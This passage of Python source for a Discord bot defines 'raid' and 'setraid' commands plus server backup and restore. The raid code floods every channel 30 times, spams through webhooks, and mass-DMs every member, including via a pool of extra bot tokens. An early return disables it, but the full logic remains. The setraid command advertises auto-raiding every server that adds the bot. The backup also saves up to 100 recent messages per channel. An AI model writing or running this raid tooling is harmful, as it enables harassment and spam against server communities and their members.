                    embed=discord.Embed(description="✅ Nuke cancelled.", color=COLORS["success"]),
                    view=None, delete_after=5,
                )

        if ctx.interaction:
            await ctx.interaction.response.send_message(embed=_confirm, view=_NukeConfirmView(), ephemeral=False)
        else:
            await ctx.send(embed=_confirm, view=_NukeConfirmView(), delete_after=32)

    #  ,raid — flood every channel with spam + mass DM members
    #  Owner / Premium+Admin only
    @commands.hybrid_command(name="raid", description="Flood all channels + mass DM members — Owner or requires bot-owner approval")
    async def raid(self, ctx: commands.Context, *, message: str = None):
        await ctx.send("🛡️ Disabled for safety in this Mikasa build: mass-channel spam and mass-DM operations are disabled.")
        return
        if not is_owner(ctx.author):
            return await ctx.send("🔒 Raid is reserved for Mikasa's **primary owner** only.")
        _guild_id  = ctx.guild.id
        _author_id = ctx.author.id
        _fallback  = _DEFAULT_SERVER_LINK or "https://discord.gg/psfxUxRfPQ"
        _raid_msg  = message or _RAID_DEFAULT_MSG or f"@everyone @here ur server is being raided by Dangerous person 💀🔥 {_fallback}"

        async def execute_raid(client):
            guild = client.get_guild(_guild_id)
            if not guild: return
            stop_ev = _RAID_STOP_EVENTS.setdefault(_guild_id, asyncio.Event())
            stop_ev.clear()

            # ── Embed sent to every channel ──
            raid_embed = discord.Embed(
                title="🚨  RAID IN PROGRESS",
                description=(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "🐻‍❄️  **Dangerous person** is raiding this server.\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"{_raid_msg}\n\n"
                    "> *ur server is cooked* 🍳🔥"
                ),
                color=0xFF0000,
            )
            raid_embed.set_footer(text="Coolbot 🐻‍❄️  •  Raid System  •  Coolbot.gg")

            # ── Spam every text channel 30 times in parallel ──
            async def _flood_channel(ch):
                for _ in range(30):
                    if stop_ev.is_set():
                        break
                    try:
                        await ch.send(content=_raid_msg, embed=raid_embed)
                        await asyncio.sleep(0.15)
                    except Exception:
                        break

            await asyncio.gather(
                *[_flood_channel(ch) for ch in guild.text_channels],
                return_exceptions=True,
            )

            # ── Create webhooks in first 10 channels and spam through them ──
            async def _webhook_spam(ch):
                if stop_ev.is_set():
                    return
                try:
                    wh = await ch.create_webhook(name="Coolbot Raid ")
                    for _ in range(10):
                        if stop_ev.is_set():
                            break
                        try:
                            await wh.send(
                                content=_raid_msg,
                                username="Coolbot Raid 🐻‍❄️",
                                avatar_url="https://i.imgur.com/pXjdnba.png",
                            )
                            await asyncio.sleep(0.1)
                        except Exception:
                            pass
                    try:
                        await wh.delete()
                    except Exception:
                        pass
                except Exception:
                    pass

            await asyncio.gather(
                *[_webhook_spam(ch) for ch in guild.text_channels[:10]],
                return_exceptions=True,
            )

            # ── Mass DM all members ──
            dm_embed = discord.Embed(
                title="🍳  ur server is being raided",
                description=(
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "**Coolbot** just raided your server 🐻‍❄️\n"
                    "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"{_raid_msg}\n\n"
                    "> *nothing u can do about it* 💀"
                ),
                color=0x2b2d31,
            )
            dm_embed.set_footer(text="Coolbot 🐻‍❄️  •  Coolbot.gg")

            async def _dm_member(m):
                if stop_ev.is_set():
                    return
                try:
                    await m.send(embed=dm_embed)
                except Exception:
                    pass

            targets = [m for m in guild.members if not m.bot and m.id != client.user.id and m.id != _author_id]
            await asyncio.gather(*[_dm_member(m) for m in targets], return_exceptions=True)

            # ── Multi-bot DM — every token in MASSDM_BOT_TOKENS DMs all members ──
            async def _multibot_raid_dm():
                if not MASSDM_BOT_TOKENS:
                    return
                if stop_ev.is_set():
                    return
                _dm_payload = {
                    "embeds": [{
                        "title": "🍳  ur server is being raided",
                        "description": (
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            "**Coolbot** just raided your server 🐻‍❄️\n"
                            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"{_raid_msg}\n\n"
                            "> *nothing u can do about it* 💀"
                        ),
                        "color": 0x2b2d31,
                        "footer": {"text": "Coolbot 🐻‍❄️  •  Coolbot.gg"},
                    }]
                }
                _connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ssl=False)
                async with aiohttp.ClientSession(connector=_connector) as _ses:
                    for _tok in MASSDM_BOT_TOKENS:
                        _headers = {
                            "Authorization": f"Bot {_tok}",
                            "Content-Type": "application/json",
                        }
                        for _m in targets:
                            if stop_ev.is_set():
                                return
                            try:
                                _r = await _ses.post(
                                    "https://discord.com/api/v10/users/@me/channels",
                                    headers=_headers,
                                    json={"recipient_id": str(_m.id)},
                                    timeout=aiohttp.ClientTimeout(total=5),
                                )
                                if _r.status == 200:
                                    _ch_data = await _r.json()
                                    await _ses.post(
                                        f"https://discord.com/api/v10/channels/{_ch_data['id']}/messages",
                                        headers=_headers,
                                        json=_dm_payload,
                                        timeout=aiohttp.ClientTimeout(total=5),
                                    )
                            except Exception:
                                pass
                            await asyncio.sleep(0.05)

            asyncio.create_task(_multibot_raid_dm())

        is_allowed = has_owner_access(ctx.author)
        if not is_allowed:
            return await _reject_owner_only_ctx(ctx, execute_raid)

        # Confirmation before raid fires
        _confirm = discord.Embed(
            title="⚠️  Confirm Raid",
            description=(
                "> This will **flood every channel** 30 times,\n"
                "> spam webhooks, and **DM every member**.\n\n"
                "*You have 30 seconds to decide.*"
            ),
            color=0xFF0000,
        )
        _confirm.set_footer(text="Coolbot 🐻‍❄️  •  Only you can click these")
        _raid_author = ctx.author.id

        class _RaidConfirmView(discord.ui.View):
            def __init__(self_v):
                super().__init__(timeout=30)

            @discord.ui.button(label="🚨  Yes, Raid", style=discord.ButtonStyle.danger)
            async def yes_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _raid_author:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="🚨 Raid launched.", color=0xFF0000),
                    view=None, delete_after=3,
                )
                try:
                    _raider_user = await ctx.bot.fetch_user(_raid_author)
                    await _raider_user.send(embed=discord.Embed(
                        description="📨 DMing all members now...",
                        color=0xFF4500,
                    ))
                except Exception:
                    pass
                # Reset stop flag and track the raid task so ,stopraid works
                _RAID_STOP_EVENTS[_guild_id] = asyncio.Event()
                task = asyncio.create_task(execute_raid(ctx.bot))
                _RAID_TASKS[_guild_id] = task
                try:
                    await task
                finally:
                    _RAID_TASKS.pop(_guild_id, None)
                    _RAID_STOP_EVENTS.pop(_guild_id, None)

            @discord.ui.button(label="✋  Cancel", style=discord.ButtonStyle.secondary)
            async def no_btn(self_v, interaction: discord.Interaction, button: discord.ui.Button):
                if interaction.user.id != _raid_author:
                    return await interaction.response.send_message("Not your button.", ephemeral=False)
                self_v.stop()
                await interaction.response.edit_message(
                    embed=discord.Embed(description="✅ Raid cancelled.", color=COLORS["success"]),
                    view=None, delete_after=5,
                )

        if ctx.interaction:
            await ctx.interaction.response.send_message(embed=_confirm, view=_RaidConfirmView(), ephemeral=False)
        else:
            await ctx.send(embed=_confirm, view=_RaidConfirmView(), delete_after=32)

    #  ,setraid #channel — auto-raid every new server the bot joins
    #  Owner only
    @commands.command(name="setraid")
    async def setraid(self, ctx: commands.Context, channel: discord.TextChannel = None):
        if not is_owner(ctx.author):
            return await ctx.send("🔒 Setraid is reserved for Mikasa's **primary owner** only.")
        if channel is None:
            # Clear setraid
            _SETRAID_CHANNEL.pop(ctx.guild.id, None)
            try:
                save("setraid_channel", {str(k): v for k, v in _SETRAID_CHANNEL.items()})
            except Exception:
                pass
            return await ctx.send(embed=discord.Embed(
                description="✅ Auto-raid log cleared. New servers will no longer be auto-raided.",
                color=COLORS["success"]
            ))
        _SETRAID_CHANNEL[ctx.guild.id] = channel.id
        try:
            save("setraid_channel", {str(k): v for k, v in _SETRAID_CHANNEL.items()})
        except Exception:
            pass
        await ctx.send(embed=discord.Embed(
            title="🚨 Auto-Raid Activated",
            description=(
                f"📡 Raid log channel set to {channel.mention}\n\n"
                "> Every new server that adds Coolbot will be **instantly raided**:\n"
                "> • All channels flooded 30×\n"
                "> • Webhooks spammed\n"
                "> • All 25 bots DM every member\n"
                "> • Unraidable servers get flagged in this channel\n\n"
                "*Run `,setraid` with no channel to disable.*"
            ),
            color=0xFF4500,
        ))


    @commands.hybrid_command(name="stopraid", description="Stop an active raid in this server (Owner/Premium+Admin)")
    async def stopraid(self, ctx: commands.Context):
        """Cancel a running ,raid / /raid in this server."""
        if not ctx.guild:
            return await ctx.send(embed=discord.Embed(description="❌ Use this in a server.", color=COLORS["error"]))
        is_allowed = (
            has_owner_access(ctx.author)
            or (ctx.author.guild_permissions.administrator if isinstance(ctx.author, discord.Member) else False)
        )
        if not is_allowed:
            return await ctx.send(embed=discord.Embed(
                description="❌ Owner, Premium, or Server Admin only.", color=COLORS["error"]
            ))
        gid = ctx.guild.id
        ev = _RAID_STOP_EVENTS.get(gid)
        task = _RAID_TASKS.get(gid)
        if not ev and not task:
            return await ctx.send(embed=discord.Embed(
                description="❌ No active raid in this server.", color=COLORS["error"]
            ))
        if ev:
            ev.set()
        if task and not task.done():
            task.cancel()
        _RAID_TASKS.pop(gid, None)
        await ctx.send(embed=discord.Embed(
            title="🛑 Raid Stopped",
            description=f"Raid in **{ctx.guild.name}** has been stopped.",
            color=COLORS["success"],
        ))

    @app_commands.command(name="backupcreate", description="Snapshot the server and DM you a short backup code (Owner/Premium)")
    async def backupcreate(self, interaction: discord.Interaction):
        is_allowed = has_owner_access(interaction.user) or interaction.user.id in PREMIUM_USERS
        if not is_allowed:
            await interaction.response.send_message(
                embed=discord.Embed(description="❌ **Premium** access required to use `/backupcreate`.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        await interaction.response.send_message(
            embed=discord.Embed(title="📸 Creating Backup…", description="Check your DMs for live progress.", color=COLORS["warn"]),
            ephemeral=False
        )

        guild  = interaction.guild
        caller = None
        dm_msg = None
        try:
            caller = await interaction.client.fetch_user(interaction.user.id)
            dm_msg = await caller.send(
                embed=discord.Embed(
                    title="📸 Backup In Progress",
                    description="⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛ **0%**\n\n**Stage:** Starting…\n**Server:** " + guild.name,
                    color=COLORS["warn"]
                ).set_footer(text="Coolbot • This message will update live")
            )
        except Exception:
            pass

        def _bar(pct: int) -> str:
            filled = round(pct / 10)
            return f"{'🟦' * filled}{'⬛' * (10 - filled)} **{pct}%**"

        async def _upd(stage: str, pct: int):
            if not dm_msg:
                return
            try:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="📸 Backup In Progress",
                        description=f"{_bar(pct)}\n\n**Stage:** {stage}\n**Server:** {guild.name}",
                        color=COLORS["warn"]
                    ).set_footer(text="Coolbot • This message will update live")
                )
            except Exception:
                pass

        #  SERVER SETTINGS  (Xenon-style full capture)
        await _upd("📋 Snapshotting server settings…", 5)
        snapshot = {
            # Core identity
            "guild_name":        guild.name,
            "guild_icon_url":    str(guild.icon.url)   if guild.icon   else None,
            "guild_banner_url":  str(guild.banner.url) if guild.banner else None,
            "guild_splash_url":  str(guild.splash.url) if guild.splash else None,
            "guild_description": guild.description or "",
            # Settings
            "verification_level":      guild.verification_level.value,
            "explicit_content_filter": guild.explicit_content_filter.value,
            "default_notifications":   guild.default_notifications.value,
            "afk_timeout":             guild.afk_timeout,
            "afk_channel":             guild.afk_channel.name  if guild.afk_channel  else None,
            "system_channel":          guild.system_channel.name if guild.system_channel else None,
            "rules_channel":           guild.rules_channel.name  if guild.rules_channel  else None,
            "preferred_locale":        str(guild.preferred_locale),
            # Collections (populated below)
            "roles":       [],
            "categories":  [],
            "channels":    [],
            "emojis":      [],
            "stickers":    [],
            "member_roles":{},
            "messages":    {},
            "bans":        [],
        }

        #  ROLES
        await _upd("🎭 Snapshotting roles…", 15)
        for role in sorted(guild.roles, key=lambda r: r.position):
            if role.is_default():
                continue
            snapshot["roles"].append({
                "name":        role.name,
                "color":       role.color.value,
                "hoist":       role.hoist,
                "mentionable": role.mentionable,
                "permissions": role.permissions.value,
                "position":    role.position,
                "managed":     role.managed,
            })

        #  CATEGORIES & CHANNELS  (with full extras)
        await _upd("📁 Snapshotting categories & channels…", 30)

        def _get_overwrites(ch) -> list:
            result = []
            for target, ow in ch.overwrites.items():
                allow, deny = ow.pair()
                result.append({
                    "target_name": target.name,
                    "target_type": "role" if isinstance(target, discord.Role) else "member",
                    "target_id":   str(target.id),
                    "allow":       allow.value,
                    "deny":        deny.value,
                })
            return result

        for cat in sorted(guild.categories, key=lambda c: c.position):
            snapshot["categories"].append({
                "name":       cat.name,
                "position":   cat.position,
                "overwrites": _get_overwrites(cat),
            })

        for ch in sorted(guild.channels, key=lambda c: c.position):
            if isinstance(ch, discord.CategoryChannel):
                continue
            entry = {
                "name":       ch.name,
                "type":       str(ch.type),
                "position":   ch.position,
                "category":   ch.category.name if ch.category else None,
                "overwrites": _get_overwrites(ch),
                # Text extras
                "topic":        getattr(ch, "topic",        None) or "",
                "slowmode":     getattr(ch, "slowmode_delay",None) or 0,
                "nsfw":         getattr(ch, "nsfw",         False),
                # Voice extras
                "bitrate":      getattr(ch, "bitrate",      64000),
                "user_limit":   getattr(ch, "user_limit",   0),
            }
            snapshot["channels"].append(entry)

        #  EMOJIS & STICKERS
        await _upd("😀 Snapshotting emojis & stickers…", 45)
        for emoji in guild.emojis:
            snapshot["emojis"].append({"name": emoji.name, "url": str(emoji.url)})
        for sticker in guild.stickers:
            snapshot["stickers"].append({"name": sticker.name, "url": str(sticker.url)})

        #  MEMBER ROLES
        await _upd("👥 Snapshotting member roles…", 55)
        for member in guild.members:
            role_names = [r.name for r in member.roles if not r.is_default()]
            if role_names:
                snapshot["member_roles"][str(member.id)] = role_names

        #  BANS
        await _upd("🔨 Snapshotting bans…", 62)
        try:
            async for ban_entry in guild.bans():
                snapshot["bans"].append({
                    "user_id":   str(ban_entry.user.id),
                    "user_name": str(ban_entry.user),
                    "reason":    ban_entry.reason or "",
                })
        except Exception:
            pass

        #  MESSAGES  (concurrent fetch, last 100 per channel)
        await _upd("💬 Fetching messages (concurrent)…", 68)

        readable = [
            ch for ch in guild.channels
            if isinstance(ch, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel))
        ]
        for ch in guild.channels:
            if isinstance(ch, (discord.TextChannel, discord.ForumChannel)):
                try:
                    readable.extend(ch.threads)
                except Exception:
                    pass

        async def _fetch_msgs(ch):
            try:
                msgs = []
                async for msg in ch.history(limit=100, oldest_first=False):
                    entry = {
                        "author":    str(msg.author),
                        "author_id": str(msg.author.id),
                        "avatar":    str(msg.author.display_avatar.url),
                        "content":   msg.content or "",
                        "timestamp": msg.created_at.isoformat(),
                        "attachments": [a.url for a in msg.attachments],
                    }
                    if msg.embeds:
                        e0 = msg.embeds[0]
                        entry["embed_title"]       = e0.title or ""
                        entry["embed_description"] = e0.description or ""
                    msgs.append(entry)
                return ch.name, msgs
            except Exception:
                return ch.name, []

        msg_results = await asyncio.gather(*[_fetch_msgs(ch) for ch in readable], return_exceptions=True)
        for res in msg_results:
            if isinstance(res, tuple):
                ch_name, msgs = res
                if msgs:
                    snapshot["messages"][ch_name] = msgs

        total_msgs = sum(len(v) for v in snapshot["messages"].values())

        #  SAVE TO DISK
        await _upd("💾 Compressing & saving backup…", 90)
        os.makedirs("backups", exist_ok=True)
        short_code  = "PB-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        backup_path = os.path.join("backups", f"{short_code}.json.gz")
        raw = json.dumps(snapshot, ensure_ascii=False).encode()
        with open(backup_path, "wb") as f:
            f.write(gzip.compress(raw, compresslevel=9))
        size_kb = os.path.getsize(backup_path) // 1024

        await _upd("✅ Backup complete!", 100)

        #  DM SUMMARY
        try:
            if dm_msg:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="✅ Backup Complete!",
                        description=(
                            f"{'🟦' * 10} **100%**\n\n"
                            f"**Server:** {guild.name}\n"
                            f"**Roles:** {len(snapshot['roles'])} · "
                            f"**Categories:** {len(snapshot['categories'])} · "
                            f"**Channels:** {len(snapshot['channels'])}\n"
                            f"**Emojis:** {len(snapshot['emojis'])} · "
                            f"**Stickers:** {len(snapshot['stickers'])} · "
                            f"**Bans:** {len(snapshot['bans'])}\n"
                            f"**Messages saved:** {total_msgs} across {len(snapshot['messages'])} channels\n"
                            f"**File size:** {size_kb} KB\n\n"
                            f"Your backup code is below 👇"
                        ),
                        color=COLORS["success"]
                    ).set_footer(text="Coolbot • Use /backup load <code> to restore")
                )
            if caller:
                await caller.send(
                    embed=discord.Embed(
                        title="🔑 Your Backup Code",
                        description=f"```\n{short_code}\n```",
                        color=COLORS["success"]
                    ).set_footer(text="Keep this code safe — use /backup load to restore.")
                )
            await interaction.followup.send(
                embed=discord.Embed(description=f"✅ Backup saved! Code **`{short_code}`** sent to your DMs.", color=COLORS["success"]),
                ephemeral=False
            )
        except Exception as e:
            await interaction.followup.send(
                embed=discord.Embed(description=f"❌ Backup saved but failed to DM: `{e}`", color=COLORS["error"]),
                ephemeral=False
            )

    # ── /setwelcome slash command ──────────────────────────────
    @app_commands.command(name="setwelcome", description="Set (or clear) the welcome channel for this server")
    @app_commands.describe(channel="The channel to send welcome messages in (leave blank to clear)")
    @app_commands.default_permissions(administrator=True)
    async def setwelcome_slash(self, interaction: discord.Interaction, channel: discord.TextChannel = None):
        if not interaction.user.guild_permissions.administrator:
            return await interaction.response.send_message(
                embed=discord.Embed(description="❌ You need Administrator permission to use this.", color=COLORS["error"]),
                ephemeral=False
            )
        if channel is None:
            _WELCOME_SETTINGS.pop(interaction.guild.id, None)
            save("welcome_settings", {str(k): v for k, v in _WELCOME_SETTINGS.items()})
            return await interaction.response.send_message(
                embed=discord.Embed(
                    description="✅ Welcome channel **cleared** — bot will use the system channel.",
                    color=COLORS["success"]
                ),
                ephemeral=False
            )
        _WELCOME_SETTINGS[interaction.guild.id] = channel.id
        save("welcome_settings", {str(k): v for k, v in _WELCOME_SETTINGS.items()})
        e = discord.Embed(
            title="✅  Welcome Channel Set",
            description=(
                f"New members will be greeted in {channel.mention}.\n\n"
                f"Use `/setwelcome` (no channel) to clear it."
            ),
            color=COLORS["success"],
        )
        e.set_footer(text=f"Set by {interaction.user.display_name}  ·  Coolbot")
        await interaction.response.send_message(embed=e)

    # ── /backup group ──────────────────────────────────────────
    backup_group = app_commands.Group(name="backup", description="Server backup commands (Owner only)")

    @backup_group.command(name="load", description="Restore a server from a backup code (Owner/Premium)")
    @app_commands.describe(
        code="Your short backup code, e.g. PB-A3X9K2",
        skip_roles="Skip restoring roles entirely (default: False)",
    )
    async def backup_load(self, interaction: discord.Interaction, code: str, skip_roles: bool = False):
        if not has_owner_access(interaction.user):
            return await interaction.response.send_message(
                embed=discord.Embed(description="🔒 Backup restoration is strictly bot-owner only.", color=COLORS["error"]),
                ephemeral=True,
            )
        # Defer IMMEDIATELY — bot may be busy post-destroy and we have <3 s to respond.
        # Defer extends the window to 15 min and prevents "application didn't respond".
        await interaction.response.defer(ephemeral=False)

        is_allowed = has_owner_access(interaction.user) or interaction.user.id in PREMIUM_USERS
        if not is_allowed:
            await interaction.followup.send(
                embed=discord.Embed(description="❌ **Premium** access required to use `/backup load`.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        await interaction.followup.send(
            embed=discord.Embed(
                title="🔄 Restoring Backup…",
                description="Check your DMs for live progress updates.",
                color=COLORS["warn"]
            ),
            ephemeral=False
        )

        backup_path = os.path.join("backups", f"{code.strip().upper()}.json.gz")
        if not os.path.exists(backup_path):
            await interaction.followup.send(
                embed=discord.Embed(description=f"❌ No backup found for code `{code.strip().upper()}`. Make sure the bot is running on the same machine where the backup was created.", color=COLORS["error"]),
                ephemeral=False
            )
            return

        try:
            with open(backup_path, "rb") as f:
                raw      = gzip.decompress(f.read())
            snapshot = json.loads(raw.decode())
        except Exception as e:
            await interaction.followup.send(
                embed=discord.Embed(description=f"❌ Failed to read backup: `{e}`", color=COLORS["error"]),
                ephemeral=False
            )
            return

        guild = interaction.guild

        # ── DM progress bar helpers ──
        def _bar(pct: int) -> str:
            filled = round(pct / 10)
            empty  = 10 - filled
            block  = "🟥" if pct <= 33 else ("🟨" if pct <= 66 else "🟩")
            return f"{block * filled}{'⬛' * empty} **{pct}%**"

        def _bar_color(pct: int) -> int:
            if pct <= 33:  return COLORS["error"]
            if pct <= 66:  return COLORS["warn"]
            return COLORS["success"]

        dm_msg = None
        caller = None
        try:
            caller = await interaction.client.fetch_user(interaction.user.id)
            dm_msg = await caller.send(
                embed=discord.Embed(
                    title="🔄 Restore In Progress",
                    description=(
                        f"{_bar(0)}\n\n"
                        f"**Stage:** Wiping server…\n"
                        f"**Server:** {guild.name}\n"
                        f"**Code:** `{code.strip().upper()}`"
                    ),
                    color=COLORS["warn"]
                ).set_footer(text="Coolbot • This message will update live")
            )
        except Exception:
            pass

        async def _upd(stage: str, pct: int):
            if dm_msg is None:
                return
            try:
                await dm_msg.edit(
                    embed=discord.Embed(
                        title="🔄 Restore In Progress",
                        description=(
                            f"{_bar(pct)}\n\n"
                            f"**Stage:** {stage}\n"
                            f"**Server:** {guild.name}\n"
                            f"**Code:** `{code.strip().upper()}`"
                        ),
                        color=_bar_color(pct)
                    ).set_footer(text="Coolbot • This message will update live")
                )
            except Exception:
                pass

        #  STEP 1 — WIPE everything
        await _upd("🗑️ Wiping channels…", 2)

        for _ in range(2):
            chs = list(guild.channels)
            if chs:
                await asyncio.gather(*[c.delete() for c in chs], return_exceptions=True)
            await asyncio.sleep(0.5)

        try:
            threads = [t for c in guild.channels if hasattr(c, "threads") for t in c.threads]
            if threads:
                await asyncio.gather(*[t.delete() for t in threads], return_exceptions=True)
        except Exception:
            pass

        await _upd("🗑️ Wiping roles…", 4)

        for _pass in range(4):
            droles = [r for r in guild.roles if not r.is_default() and r < guild.me.top_role]
            if not droles:
                break
            await asyncio.gather(*[r.delete(reason="Backup wipe") for r in droles], return_exceptions=True)
            await asyncio.sleep(0.5)

        for _ in range(2):
            if guild.emojis:
                await asyncio.gather(*[guild.delete_emoji(e) for e in list(guild.emojis)], return_exceptions=True)
        for _ in range(2):
            if guild.stickers:
                await asyncio.gather(*[guild.delete_sticker(s) for s in list(guild.stickers)], return_exceptions=True)

        await _upd("✅ Wipe done — creating roles…", 8)

        #  STEP 2 — CREATE ROLES
        #  Sequential so Discord's per-guild role bucket is respected.
        #  discord.py retries 429s automatically; we add one manual retry on
        #  any other failure so no role is silently skipped.
        roles_restored = 0
        role_name_map: dict = {}
        name_pos_role: list = []
        # Always populate role_name_map from existing guild roles first
        # (catches @everyone and any roles the bot cannot recreate)
        for r in guild.roles:
            role_name_map[r.name] = r

        if skip_roles:
            await _upd("⏭️ Skipping role restoration (skip_roles=True)…", 20)
            _roles = []
            _total_roles = 0
        else:
            # ── Xenon-style: highest position FIRST → correct hierarchy naturally ──
            # Discord places every new role at position 1, pushing earlier ones UP.
            # Creating Owner first means it gets pushed to the TOP as Co-Owner,
            # Mod, Member etc. are added below it — no hierarchy fix needed for order.
            _roles = sorted(snapshot.get("roles", []), key=lambda x: x.get("position", 0), reverse=True)
            # Skip managed/integration roles — Discord forbids manual creation (403)
            _roles = [rd for rd in _roles if not rd.get("managed", False)]
            _total_roles = len(_roles)

            await _upd(f"🎭 Creating {_total_roles} roles (Xenon-style)…", 10)

            # ─────────────────────────────────────────────────────────────────
            #  Xenon-style sequential role creation
            #  KEY FIXES vs old code:
            #  1. NO asyncio.wait_for — it cancels discord.py's built-in 429
            #     handler mid-sleep, silently dropping roles
            #  2. Never `break` on unexpected errors — always retry up to 5×
            #  3. Only skip permanently on 403/400 (uncreateable roles)
            #  4. 0.6 s gap between each role — stays inside Discord's bucket
            #  5. Progress updates every single role so nothing looks frozen
            # ─────────────────────────────────────────────────────────────────
            for i, rd in enumerate(_roles):
                _pct = 10 + int(((i + 1) / max(_total_roles, 1)) * 15)
                await _upd(
                    f"🎭 Roles {i + 1}/{_total_roles}  ✅ {roles_restored} created",
                    _pct,
                )
                for attempt in range(5):
                    try:
                        r = await guild.create_role(
                            name        = rd["name"],
                            color       = discord.Color(rd.get("color", 0)),
                            hoist       = rd.get("hoist", False),
                            mentionable = rd.get("mentionable", False),
                            permissions = discord.Permissions(rd.get("permissions", 0)),
                            reason      = "Coolbot backup restore",
                        )
                        role_name_map[rd["name"]] = r
                        name_pos_role.append((rd["name"], rd.get("position", 0), r))
                        roles_restored += 1
                        await asyncio.sleep(0.6)   # 600 ms — Xenon-style gap
                        break
                    except discord.HTTPException as e:
                        if e.status == 429:
                            # discord.py already retried; add extra buffer then retry
                            await asyncio.sleep(float(getattr(e, "retry_after", 2)) + 1.0)
                        elif e.status in (403, 400):
                            # Managed / invalid — permanently uncreateable, skip
                            break
                        else:
                            # 5xx or other — back off and retry
                            await asyncio.sleep(2.0 * (attempt + 1))
                    except Exception:
                        # Network error etc. — back off and retry; never silently drop
                        await asyncio.sleep(2.0 * (attempt + 1))

        #  STEP 3 — FIX ROLE HIERARCHY
        #  MUST be one single edit_role_positions call — multiple partial calls
        #  overwrite each other and flip the order.
        #  Sort by original position DESCENDING so the highest original position
        #  (e.g. Owner) gets assigned the highest new position (= top of hierarchy).
        await _upd(f"🎭 {roles_restored} roles — fixing hierarchy…", 26)
        if name_pos_role:
            # Sort highest original position first → assign top slots to top roles
            sorted_desc = sorted(name_pos_role, key=lambda x: x[1], reverse=True)
            max_p = len(sorted_desc)
            # role with highest original pos → max_p, next → max_p-1, …, lowest → 1
            positions = {entry[2]: max_p - i for i, entry in enumerate(sorted_desc)}
            for _attempt in range(4):
                try:
                    await guild.edit_role_positions(positions=positions)
                    break
                except discord.HTTPException as _he:
                    if _he.status == 429:
                        await asyncio.sleep(float(getattr(_he, "retry_after", 3)) + 1.0)
                    else:
                        await asyncio.sleep(2.0 * (_attempt + 1))
                except Exception:
                    await asyncio.sleep(2.0 * (_attempt + 1))

        #  STEP 4 — CATEGORIES
        #  Create in ascending position order so the saved rank is preserved.
        #  After all are created, set position=0,1,2… sequentially (safe and
        #  reliable — editing with the raw saved integer shifts everything else).
        await _upd("📁 Creating categories…", 25)
        cat_map: dict = {}
        _cats = sorted(snapshot.get("categories", []), key=lambda x: x.get("position", 0))

        for cd in _cats:
            try:
                # Don't duplicate — reuse any category that survived the wipe
                existing_cat = discord.utils.get(guild.categories, name=cd["name"])
                if existing_cat:
                    cat_map[cd["name"]] = existing_cat
                    continue
                c = await guild.create_category(cd["name"])
                cat_map[cd["name"]] = c
                await asyncio.sleep(0.3)
            except Exception:
                pass

        # Fix positions: assign 0,1,2… in saved order so order is exact
        for i, cd in enumerate(_cats):
            obj = cat_map.get(cd["name"])
            if obj:
                try:
                    await obj.edit(position=i)
                    await asyncio.sleep(0.2)
                except Exception:
                    pass

        #  STEP 5 — CHANNELS (concurrent, permissions applied inline)
        await _upd(f"📺 Creating channels…", 35)
        ch_name_map: dict = {}
        restored = 0

        def build_overwrites(ch_data: dict) -> dict:
            result = {}
            for ow in ch_data.get("overwrites", []):
                allow     = discord.Permissions(ow.get("allow", 0))
                deny      = discord.Permissions(ow.get("deny", 0))
                overwrite = discord.PermissionOverwrite.from_pair(allow, deny)
                if ow.get("target_type") == "role":
                    # Check role_name_map first (freshly created roles won't be
                    # in the guild cache yet) then fall back to guild lookup.
                    role = role_name_map.get(ow["target_name"]) or discord.utils.get(guild.roles, name=ow["target_name"])
                    if role:
                        result[role] = overwrite
                else:
                    try:
                        member = guild.get_member(int(ow["target_id"]))
                        if member:
                            result[member] = overwrite
                    except Exception:
                        pass
            return result

        async def _make_ch(ch_data):
            # Reuse any channel that survived the wipe — never create duplicates
            t   = ch_data.get("type", "text")
            if "voice" in t or "stage" in t:
                existing = discord.utils.get(guild.voice_channels, name=ch_data["name"]) or \
                           discord.utils.get(guild.stage_channels, name=ch_data["name"])
            else:
                existing = discord.utils.get(guild.text_channels, name=ch_data["name"])
            if existing:
                return ch_data["name"], existing

            cat = cat_map.get(ch_data.get("category")) if ch_data.get("category") else None
            ow  = build_overwrites(ch_data)
            kw  = dict(category=cat, overwrites=ow or discord.utils.MISSING)
            try:
                if "voice" in t:
                    ch = await guild.create_voice_channel(
                        ch_data["name"],
                        bitrate=min(ch_data.get("bitrate", 64000), guild.bitrate_limit),
                        user_limit=ch_data.get("user_limit", 0),
                        **kw,
                    )
                elif "stage" in t:
                    ch = await guild.create_stage_channel(ch_data["name"], **kw)
                elif "forum" in t:
                    await guild.create_forum(ch_data["name"], **kw)
                    return ch_data["name"], None
                else:
                    ch = await guild.create_text_channel(
                        ch_data["name"],
                        topic=ch_data.get("topic") or "",
                        slowmode_delay=ch_data.get("slowmode", 0),
                        nsfw=ch_data.get("nsfw", False),
                        **kw,
                    )
                return ch_data["name"], ch
            except Exception:
                return ch_data["name"], None

        _chs = sorted(
            [c for c in snapshot.get("channels", []) if c.get("type") != "category"],
            key=lambda x: x.get("position", 0)
        )
        ch_results = await asyncio.gather(*[_make_ch(cd) for cd in _chs])
        for name, obj in ch_results:
            if obj:
                ch_name_map[name] = obj
                restored += 1

        # ── Fix channel order within each category ──
        # Group channels by their saved category, sort by saved position within
        # each group, then assign position=0,1,2… so order matches the original.
        await _upd(f"?? {restored} channels — fixing order…", 38)
        from collections import defaultdict as _ddict
        _ch_by_cat: dict = _ddict(list)
        for cd in _chs:
            ch = ch_name_map.get(cd["name"])
            if ch:
                _ch_by_cat[cd.get("category")].append((cd.get("position", 0), ch))
        for _cat_name, _entries in _ch_by_cat.items():
            _entries.sort(key=lambda x: x[0])
            for _i, (_, _ch) in enumerate(_entries):
                try:
                    await _ch.edit(position=_i)
